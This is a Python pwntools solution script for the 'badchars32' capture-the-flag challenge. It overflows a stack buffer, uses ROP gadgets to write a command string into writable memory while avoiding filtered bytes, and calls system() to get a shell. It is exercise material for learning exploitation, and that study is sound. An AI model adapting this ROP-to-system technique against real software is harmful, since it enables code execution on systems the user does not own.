import sys; sys.path.append("../..")
import shared_pwn
from pwn import *

BINARY_NAME = "badchars32"
BUFFER_LEN = 44

io = process(f"./{BINARY_NAME}")

junk = b"\x90" * BUFFER_LEN

#            b    i    c    f    n    s    /   " "
badchars = [0x62,0x69,0x63,0x66,0x6e,0x73,0x20,0x2f]

g_pop      = p32(0x08048899) # pop esi; pop edi; ret; 
g_mov      = p32(0x08048893) # mov dword ptr [edi], esi; ret;
system_adr = p32(0x080484e0)

data_addr  = 0x0804a038

payload  = b""
payload += junk
payload += shared_pwn.write_string_to_memory(data_addr, ";ftp", g_pop, g_mov)
payload += system_adr
payload += p32(0x90)
payload += p32(data_addr)

io.recvuntil("\n> ")
io.send(payload)
io.send("\n")
io.interactive()
